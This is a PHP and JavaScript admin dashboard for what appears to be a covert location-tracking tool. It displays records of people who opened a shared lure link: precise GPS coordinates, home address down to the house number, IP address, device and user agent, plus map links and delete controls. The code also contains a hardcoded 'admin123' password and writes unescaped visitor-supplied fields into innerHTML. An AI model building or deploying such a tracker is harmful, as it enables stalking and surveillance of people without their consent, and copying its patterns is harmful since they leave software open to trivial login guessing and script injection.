<?php
// Simple authentication
session_start();
$password = 'admin123'; // Change this!

if(isset($_POST['password'])) {
    if($_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
    }
}

if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: index.php');
    exit;
}

if(!isset($_SESSION['logged_in'])):
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Admin Login</title>
<style>
body{margin:0;font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
.login{background:#fff;padding:40px;border-radius:15px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:350px}
h2{color:#667eea;margin-bottom:30px}
input{width:100%;padding:12px;margin:10px 0;border:2px solid #e9ecef;border-radius:8px;font-size:14px}
input:focus{outline:none;border-color:#667eea}
button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
button:hover{opacity:0.9}
</style>
</head>
<body>
<div class="login">
<h2>🔐 Admin Login</h2>
<form method="POST">
<input type="password" name="password" placeholder="Enter password" required autofocus>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>
<?php exit; endif; ?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Tracker Dashboard</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
    <div class="header">
        <h1>
            <span class="header-icon">📍</span>
            Location Tracker Dashboard
        </h1>
        <div class="stats">
            <div class="stat-item">
                <span class="stat-number" id="totalCount">0</span>
                <span class="stat-label">Total Locations</span>
            </div>
            <div class="stat-item">
                <span class="stat-number" id="lastUpdate">--:--</span>
                <span class="stat-label">Last Update</span>
            </div>
            <div class="stat-item">
                <a href="?logout" style="color:#fff;text-decoration:none;font-size:14px">🚪 Logout</a>
            </div>
        </div>
    </div>

    <div class="controls">
        <button class="btn-refresh" onclick="load()">
            <span>🔄</span> Refresh
        </button>
        <button class="btn-delete-all" onclick="deleteAll()">
            <span>🗑️</span> Delete All
        </button>
        <button class="btn-delete" onclick="deleteSelected()" id="btnDeleteSelected" disabled>
            <span>❌</span> Delete Selected
        </button>
        <div id="status"></div>
    </div>

    <div class="table-container">
        <table id="table">
            <thead>
                <tr>
                    <th style="width:40px">#</th>
                    <th>Time</th>
                    <th>Address</th>
                    <th>Street</th>
                    <th>House #</th>
                    <th>City</th>
                    <th>Browser</th>
                    <th>OS / Device</th>
                    <th>IP Address</th>
                    <th>Accuracy (m)</th>
                    <th style="width:200px">Actions</th>
                </tr>
            </thead>
            <tbody id="tbody"></tbody>
        </table>
    </div>
</div>

<div id="modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span>Location Details</span>
            <span class="close" onclick="closeModal()">&times;</span>
        </div>
        <div class="modal-body" id="modalBody"></div>
    </div>
</div>

<script>
let selectedId = null;
let locations = [];

async function load() {
    try {
        showStatus('Loading...', 'info');
        let r = await fetch('api.php');
        locations = await r.json();
        displayLocations();
        updateStats();
        showStatus(`✓ Loaded ${locations.length} location${locations.length !== 1 ? 's' : ''}`, 'success');
    } catch(e) {
        showStatus('✗ Error: ' + e.message, 'error');
    }
}

function displayLocations() {
    let html = '';
    if(locations.length === 0) {
        html = `<tr><td colspan="11" style="text-align:center">
                    <div class="empty-state">
                        <div class="empty-icon">📍</div>
                        <div class="empty-text">No locations recorded yet<br><br>Share this link: <strong>${window.location.origin}/link.php</strong></div>
                    </div>
                </td></tr>`;
    } else {
        locations.forEach((loc, i) => {
            let rowClass = loc.id === selectedId ? 'selected' : '';
            let shortAddress = loc.address ? (loc.address.length > 40 ? loc.address.substring(0, 37) + '...' : loc.address) : '-';
            
            let accuracyBadge = '';
            if(loc.accuracy) {
                if(loc.accuracy < 10) accuracyBadge = 'badge-success';
                else if(loc.accuracy < 50) accuracyBadge = 'badge-warning';
                else accuracyBadge = 'badge-danger';
            }
            
            html += `<tr class="${rowClass}" onclick="selectRow('${loc.id}')">
                <td>${i+1}</td>
                <td>${loc.time || '-'}</td>
                <td title="${loc.address || '-'}">${shortAddress}</td>
                <td>${loc.street || '-'}</td>
                <td>${loc.house_number || '-'}</td>
                <td>${loc.city || '-'}</td>
                <td>${loc.browser || '-'}</td>
                <td>${loc.os || '-'} / ${loc.device || '-'}</td>
                <td>${loc.ip || '-'}</td>
                <td><span class="badge ${accuracyBadge}">${loc.accuracy?.toFixed(1) || '-'}</span></td>
                <td>
                    <button class="btn-maps" onclick="event.stopPropagation(); openMap(${loc.lat},${loc.lon})">
                        🗺️ Maps
                    </button>
                    <button class="btn-info" onclick="event.stopPropagation(); showDetails('${loc.id}')">
                        ℹ️ Info
                    </button>
                </td>
            </tr>`;
        });
    }
    document.getElementById('tbody').innerHTML = html;
}

function updateStats() {
    document.getElementById('totalCount').textContent = locations.length;
    if(locations.length > 0) {
        const lastTime = new Date(locations[0].time);
        document.getElementById('lastUpdate').textContent = lastTime.toLocaleTimeString();
    }
}

function selectRow(id) {
    selectedId = id;
    displayLocations();
    document.getElementById('btnDeleteSelected').disabled = false;
}

function openMap(lat, lon) {
    window.open(`https://www.google.com/maps/search/?api=1&query=${lat},${lon}`, '_blank');
}

function showDetails(id) {
    let loc = locations.find(l => l.id === id);
    if(!loc) return;
    
    let html = `
        <div class="info-section section-location">
            <div class="info-section-title">📍 Location Information</div>
            <div class="info-row">
                <div class="info-label">🕐 Date & Time:</div>
                <div class="info-value">${loc.time || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">📍 Latitude:</div>
                <div class="info-value">${loc.lat?.toFixed(8) || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">📍 Longitude:</div>
                <div class="info-value">${loc.lon?.toFixed(8) || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🎯 Accuracy:</div>
                <div class="info-value">${loc.accuracy?.toFixed(2) || '-'} meters</div>
            </div>
        </div>
        
        <div class="info-section section-address">
            <div class="info-section-title">🏠 Address Details</div>
            <div class="info-row">
                <div class="info-label">📍 Full Address:</div>
                <div class="info-value">${loc.address || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🛣️ Street:</div>
                <div class="info-value">${loc.street || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🏠 House Number:</div>
                <div class="info-value">${loc.house_number || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🏙️ City:</div>
                <div class="info-value">${loc.city || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🗺️ State:</div>
                <div class="info-value">${loc.state || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">📮 Postal Code:</div>
                <div class="info-value">${loc.postcode || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🌍 Country:</div>
                <div class="info-value">${loc.country || '-'}</div>
            </div>
        </div>
        
        <div class="info-section section-user">
            <div class="info-section-title">💻 Device Information</div>
            <div class="info-row">
                <div class="info-label">🌐 Browser:</div>
                <div class="info-value">${loc.browser || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">💻 Operating System:</div>
                <div class="info-value">${loc.os || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">📱 Device Type:</div>
                <div class="info-value">${loc.device || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🌐 IP Address:</div>
                <div class="info-value">${loc.ip || '-'}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🔗 User Agent:</div>
                <div class="info-value" style="font-size:11px;word-break:break-all">${loc.user_agent || '-'}</div>
            </div>
        </div>
    `;
    
    document.getElementById('modalBody').innerHTML = html;
    document.getElementById('modal').style.display = 'block';
}

function closeModal() {
    document.getElementById('modal').style.display = 'none';
}

window.onclick = function(event) {
    if(event.target == document.getElementById('modal')) {
        closeModal();
    }
}

async function deleteSelected() {
    if(!selectedId) return;
    if(!confirm('Delete this location?')) return;
    
    try {
        let r = await fetch('api.php', {
            method: 'DELETE',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({id: selectedId})
        });
        
        let data = await r.json();
        if(data.success) {
            showStatus('✓ Deleted', 'success');
            selectedId = null;
            document.getElementById('btnDeleteSelected').disabled = true;
            load();
        }
    } catch(e) {
        showStatus('✗ Error: ' + e.message, 'error');
    }
}

async function deleteAll() {
    if(!confirm('Delete ALL locations? This cannot be undone!')) return;
    
    try {
        let r = await fetch('api.php', {
            method: 'DELETE',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({delete_all: true})
        });
        
        let data = await r.json();
        if(data.success) {
            showStatus('✓ All deleted', 'success');
            selectedId = null;
            document.getElementById('btnDeleteSelected').disabled = true;
            load();
        }
    } catch(e) {
        showStatus('✗ Error: ' + e.message, 'error');
    }
}

function showStatus(message, type) {
    const status = document.getElementById('status');
    status.textContent = message;
    status.className = type;
}

setInterval(load, 10000);
load();
</script>
</body>
</html>